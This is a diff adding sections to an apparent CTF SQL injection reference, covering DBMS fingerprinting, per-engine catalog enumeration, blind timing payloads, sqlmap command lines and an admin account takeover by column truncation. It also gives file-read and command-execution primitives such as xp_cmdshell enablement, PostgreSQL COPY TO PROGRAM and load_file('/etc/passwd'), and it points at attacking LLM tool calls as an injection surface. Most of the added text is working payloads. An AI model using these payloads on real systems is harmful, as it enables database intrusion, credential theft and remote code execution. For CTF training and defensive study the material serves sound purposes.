@@ -12,6 +12,12 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 6. WAF 在挡：注释符拆分、大小写混写、二次 URL 编码。 → 出口：绕过后回到被挡的那一步（第 3/4 步）重试；绕不过就换注入点。
 
 ## Table of Contents
+- [Identify the DBMS First](#identify-the-dbms-first)
+- [Per-DBMS Enumeration Catalog](#per-dbms-enumeration-catalog)
+- [Per-DBMS Blind Timing Primitives](#per-dbms-blind-timing-primitives)
+- [Per-DBMS File Read and Code Execution Primitives](#per-dbms-file-read-and-code-execution-primitives)
+- [sqlmap Headless Card](#sqlmap-headless-card)
+- [Where Tools Fall Short](#where-tools-fall-short)
 - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
 - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
 - [Second-Order SQL Injection](#second-order-sql-injection)
@@ -28,7 +34,7 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)](#php-pcre-backtrack-limit-waf-bypass-secuinside-2017)
 - [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
 - [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
-- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017-mysql-57-mariadb-only)
+- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017-mysql-57--mariadb-only)
 - [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
 - [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
 - [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
@@ -41,6 +47,224 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [PHP parse_str() Variable Injection (TokyoWesterns 2018)](#php-parse_str-variable-injection-tokyowesterns-2018)
 - [SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)](#sqlite-union-via-x-forwarded-for-with-phpsessid-oracle-ncsc-2019)
 - [Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)](#quote-adjacent-union-keyword-filter-bypass-tamuctf-2019)
+
+---
+
+## Identify the DBMS First
+
+Ladder steps 1-3 (close the query, `order by`, `union select`) are engine-agnostic.
+Steps 4-5 diverge: the enumeration catalog and the blind primitives are per-DBMS.
+Fingerprint **before** burning requests on the wrong dialect - one error message or
+one version probe settles it.
+
+**Error-string fingerprints** (trigger with a stray quote; read the page body or the
+debug log):
+
+| DBMS | Distinctive error snippet |
+|---|---|
+| MySQL | `You have an error in your SQL syntax ... near` |
+| PostgreSQL | `ERROR: syntax error at or near` |
+| SQLite | `SQLITE_ERROR: unrecognized token:` |
+| MSSQL | `Unclosed quotation mark after the character string` |
+| Oracle | `ORA-01756: quoted string not properly terminated` |
+
+**Version probes** (inside a working UNION):
+
+```sql
+' UNION SELECT @@version-- -                                -- MySQL, MSSQL
+' UNION SELECT version()-- -                                -- PostgreSQL
+' UNION SELECT sqlite_version()-- -                         -- SQLite
+' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- -     -- Oracle
+```
+
+**Shape probes** when errors are hidden - the dialect leaks through what parses:
+
+- Comments: `#` is MySQL-only. `--` works everywhere but needs a trailing space or
+  dash on MySQL only.
+- Concatenation: `'a'||'b'` yields `ab` on PostgreSQL/Oracle/SQLite (on default MySQL
+  it is a logical OR); MySQL wants `CONCAT('a','b')`; MSSQL wants `'a'+'b'`.
+- Identifier case: Oracle folds unquoted identifiers to UPPERCASE - lowercase guesses
+  return `ORA-00942: table or view does not exist`; uppercase or quote them.
+
+**Exit:** name the DBMS (or the top-1 candidate) before choosing an enumeration path.
+
+---
+
+## Per-DBMS Enumeration Catalog
+
+Step 4 (取库) of the ladder is `information_schema` on MySQL. Every engine answers the
+same three questions (databases, tables, columns) from its own catalog:
+
+- **MySQL**: `information_schema.schemata` -> `.tables WHERE table_schema=<db>` ->
+  `.columns WHERE table_name=<t>`. If `information_schema` is filtered, fall back to
+  `mysql.innodb_table_stats` (see the N1CTF 2018 innodb_table_stats entry below).
+- **PostgreSQL**: `pg_tables` / `pg_indexes` for tables; columns via
+  `pg_attribute WHERE attrelid='<t>'::regclass` (attname, attnum); other database
+  names via `pg_database` (datname).
+- **SQLite**: one file = one database; no cross-database catalog. `sqlite_master`
+  (name, sql) is the fastest column source - the stored `CREATE TABLE` sql names every
+  column at once (worked case: the NCSC 2019 X-Forwarded-For UNION entry below).
+  `SELECT name FROM pragma_table_info('<t>')` lists columns too (verified locally:
+  one row per column with name and type).
+- **MSSQL**: `master..sysdatabases` for databases; `sysobjects WHERE xtype='U'` for
+  tables in the current database; `syscolumns WHERE id=OBJECT_ID('<t>')` for columns.
+- **Oracle**: `all_users` / `all_tables` / `all_tab_columns`; every unquoted identifier
+  is UPPERCASE (see the shape probe above).
+
+**Exit:** table and column names in hand for the fingerprinted engine - or a proven
+filtered catalog, in which case switch to the blind ladder (step 5).
+
+---
+
+## Per-DBMS Blind Timing Primitives
+
+Step 5 (盲注) of the ladder assumes MySQL `sleep()`. Other engines burn time their own
+way - and one of them (MSSQL) needs statement stacking first.
+
+**Baseline first, all engines:** time 2-3 requests you know are false, then 2-3 you
+know are true, before extracting anything. CTF boxes carry 1-3s network noise; a
+condition only counts when the *flipped* condition flips the delay. Re-confirm before
+every extraction run.
+
+- **MySQL**: `' AND IF(<cond>, SLEEP(3), 0)-- -`; if `SLEEP` is filtered,
+  `BENCHMARK(50000000, MD5('x'))` burns comparable CPU; wide `information_schema`
+  cross-joins amplify any delay (see the processList / processlist race entries).
+- **PostgreSQL**: single statement, no stacking needed:
+  `' AND (SELECT 1 FROM pg_sleep(CASE WHEN (<cond>) THEN 3 ELSE 0 END))=1-- -` -
+  `pg_sleep` returns void, but any function is legal as a FROM item (one row, unused
+  column), so the scalar subquery parses and the condition picks the delay. Probe it
+  once with a known-true condition before extracting. If the FROM form is blocked,
+  fall back to stacked `'; SELECT CASE WHEN (<cond>) THEN pg_sleep(3) ELSE pg_sleep(0)
+  END-- -`, then to a boolean oracle: `AND 1=(CASE WHEN (<cond>) THEN 1 ELSE 0 END)`
+  and diff the response content.
+- **SQLite**: no sleep - burn CPU. `CASE WHEN (<cond>) THEN length(randomblob(30000000))
+  ELSE 0 END`: 30M random bytes cost ~0.3-0.5s on commodity cores (verified locally);
+  scale N until it clears the noise floor. A recursive CTE counting to 3M runs ~0.5s
+  (verified locally). Single query, no stacking. Worked case: the SECCON 2017
+  randomblob timing entry below.
+- **MSSQL**: `'; IF (<cond>) WAITFOR DELAY '0:0:3'-- -` - statement stacking required
+  (`WAITFOR` cannot appear inside a subquery) - the only engine here that needs it.
+- **Oracle**: no SELECT-level sleep. `DBMS_LOCK.SLEEP` needs DBA; the reachable
+  primitive is `DBMS_PIPE.RECEIVE_MESSAGE`. `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 3)-- -`
+  sleeps unconditionally (use it as the baseline sanity check); the conditional form is
+  `' AND CASE WHEN (<cond>) THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 3) ELSE 0 END=0-- -`.
+- **MongoDB** (operator injection, not SQL): `$where` busy-loop or `$function` timing -
+  see server-side-advanced-4.md (MongoDB Regex Injection / $where Blind Oracle,
+  Nullcon 2026).
+
+**Cost discipline:** extract the length first (binary search over 0..max, ~7 timed
+requests), then per character binary-search the charset (~7 requests per char). Never
+linear-scan a charset: even 70 requests x 3s each already costs ~3.5 minutes, and a
+full per-character linear sweep over the charset scales into hours.
+
+**Exit:** one boolean reproducibly encoded into a >=2s delay delta (or a stable boolean
+diff) on the fingerprinted engine.
+
+---
+
+## Per-DBMS File Read and Code Execution Primitives
+
+Post-enumeration escalation per engine. All of these need elevated database rights -
+probe for the privilege, never assume it.
+
+- **MySQL**: `load_file('/etc/passwd')` is gated by `@@secure_file_priv` - read it in
+  your UNION first: `NULL` = feature disabled, empty string = any path, a path = only
+  under that directory (packaged builds commonly ship a path such as
+  `/var/lib/mysql-files`, not `NULL`). `INTO OUTFILE` additionally needs the `FILE`
+  privilege and an *empty* `secure_file_priv` - rare in packaged builds, so treat file
+  write as a dead end until you have read the variable and it says otherwise.
+- **PostgreSQL** (superuser): `pg_read_file('/etc/passwd')` reads;
+  `COPY (SELECT '') TO PROGRAM 'id > /tmp/p'` executes shell commands. CTF networks
+  give no outbound observer - prove RCE by reading its output back through SQL
+  (`pg_read_file('/tmp/p')` inside your next UNION).
+- **SQLite**: `ATTACH DATABASE '/var/www/html/x.php' AS p` writes an arbitrary *empty*
+  file in one statement (path traversal marker, log-poisoning pivot). A full file write
+  (webshell) needs multi-statement execution on the app side (PDO::exec, sqlite3::exec)
+  - probe whether the stack tolerates `;` before investing (see the NCSC 2019 SQLite
+  UNION entry for what one statement can do).
+- **MSSQL** (sysadmin + stacked queries):
+
+  ```sql
+  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+  EXEC xp_cmdshell 'whoami';
+  ```
+
+- **Oracle**: no practical file-read or RCE primitive reachable from injection - stay
+  on UNION / error-based extraction.
+
+**Exit:** file read proven (or firmly ruled out, with the reason); claim RCE only after
+reading its output back through SQL.
+
+---
+
+## sqlmap Headless Card
+
+sqlmap ships in the image (Debian package). It is a bulk tool: aim it at one parameter,
+read the markers, move on. Runtime truth beats memory - this build may ship fewer
+tamper scripts than upstream docs list:
+
+```bash
+sqlmap --version && sqlmap --list-tampers   # what THIS image actually ships
+sqlmap -u "http://target:8000/item?id=1" -p id --batch --dbms=MySQL --technique=BEU --level=1 --risk=1
+sqlmap -r request.txt -p id --batch --flush-session    # replay a captured request byte-exactly
+```
+
+Discipline:
+
+- **One parameter at a time** (`-p id`). Full-form scans waste turns and hit stateful
+  endpoints with junk; `-r request.txt` replays the captured request exactly (auth
+  cookies, JSON bodies, odd content-types included).
+- **`--batch` always** (headless - never prompt); **`--flush-session`** after ANY
+  change to target, parameter, or technique - cached session data poisons re-runs.
+- **`--technique=BEUST`**: B boolean, E error, U union, S stacked, T time. Start with
+  `BEU`; reach for `T` only when nothing fires - time-based extraction pays seconds
+  per request.
+- **`--level`**: 1 = URL/body, 2 = +Cookie, 3 = +UA/Referer. Header injection is often
+  faster hand-crafted than a level-3 sweep (the NCSC 2019 XFF UNION case is one
+  manual request).
+- **`--risk`**: keep 1-2 on stateful targets; `--risk=3` adds OR-based and
+  UPDATE-heavy payloads that can rewrite rows you cannot restore.
+- **Boolean oracle flags** when the true/false page diff is subtle: `--string` /
+  `--not-string` (response markers), `--regexp`, `--code`.
+- **Judge by stdout markers, not exit codes**: success prints
+  `identified the following injection point`; a clean miss prints
+  `all tested parameters do not appear to be injectable`. Disk evidence lands in
+  `~/.local/share/sqlmap/output/<host>/`; add `-t traffic.log` to capture the exact
+  requests for later manual replay.
+- **Blocked by a WAF?** Apply the tamper-equivalent transforms by hand - space to
+  `/**/`, `=` to `LIKE`, case shuffle, double URL-encode. If you do reach for tampers,
+  add ONE at a time and re-test: a stack of tampers hides which one broke the syntax.
+- **When manual wins outright**: second-order (inject on page A, read on page B),
+  JSON bodies with nested syntax quirks, parameters sqlmap refuses to test, and any
+  injection whose shape you already know - a hand-built UNION is one request where
+  sqlmap burns dozens.
+
+**Exit:** injection point confirmed (stdout marker + saved request), or a recorded
+miss with the reason the manual path takes over.
+
+---
+
+## Where Tools Fall Short
+
+Gaps the ladder + sqlmap combination does not cover; each has a manual recipe:
+
+- **Second-order injection**: the payload is stored via page A and executes in a query
+  on page B. sqlmap tests one request-response pair; carry the payload across pages
+  yourself (see [Second-Order SQL Injection](#second-order-sql-injection)).
+- **PDO emulated prepares**: with `ATTR_EMULATE_PREPARES` on, binding happens
+  client-side and charset confusion can un-escape quotes. If a quote survives in one
+  charset, replay the payload under a different `SET NAMES` charset.
+- **JSON-syntax asymmetry**: filters that regex the raw body miss SQL syntax hidden
+  inside JSON strings, and vice versa. If form-encoded is blocked, re-send the same
+  parameter as JSON (`Content-Type: application/json`) before concluding "filtered".
+- **Header-vs-body parsing differences**: WAF rules often inspect the body but not
+  UA / Referer / X-Forwarded-For, or URL-decode one surface and not the other. That is
+  the `--level=3` surface - and manual header injection is usually faster.
+- **Natural-language and tool-call surfaces**: text-to-SQL apps and LLM tool calls
+  assemble SQL from prose - treat the prompt itself as the injection parameter and
+  attack it as prompt injection; this pack does not catalog that surface - for LLM
+  jailbreak worked cases see auth-and-access.md.
 
 ---
 
@@ -100,7 +324,7 @@ for pos in range(length):
 
 ## MySQL Column Truncation (VolgaCTF 2014)
 
-**Pattern:** Registration form backed by MySQL `VARCHAR(N)`. MySQL silently truncates strings longer than N characters, and ignores trailing spaces in string comparison. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an attacker-controlled password.
+**Pattern:** Registration form backed by MySQL `VARCHAR(N)` on a **PAD SPACE collation** - true for utf8mb4_general_ci / latin1_swedish_ci and most pre-8.0 defaults, false for MySQL 8's default utf8mb4_0900_* family (NO PAD). MySQL silently truncates strings longer than N characters only under a **non-strict `sql_mode`** (strict mode, the 5.7+/8.0 default, rejects the oversized INSERT with error 1406 instead), and PAD SPACE collations ignore trailing spaces in string comparison. Gate first via the same injection (`UNION SELECT @@version` / `@@sql_mode` / `@@collation_connection`): on 5.7+/8.0 defaults (strict mode; NO PAD from 8.0 on) this trick is dead - do not burn requests on it. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an attacker-controlled password.
 
 ```bash
 # VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
@@ -115,7 +339,7 @@ curl -X POST http://target/login -d 'login=admin&password=attacker123'
 ```
 
 **Why it works:**
-1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT
+1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT - non-strict `sql_mode` only; strict mode (5.7+ default) raises error 1406 instead
 2. MySQL ignores trailing spaces in `=` comparisons (SQL standard PAD SPACE behavior)
 3. `"admin" + 50 spaces + "x"` truncates to `"admin" + spaces` → matches `"admin"`
 4. The application now has two rows matching "admin" — the original and the attacker's
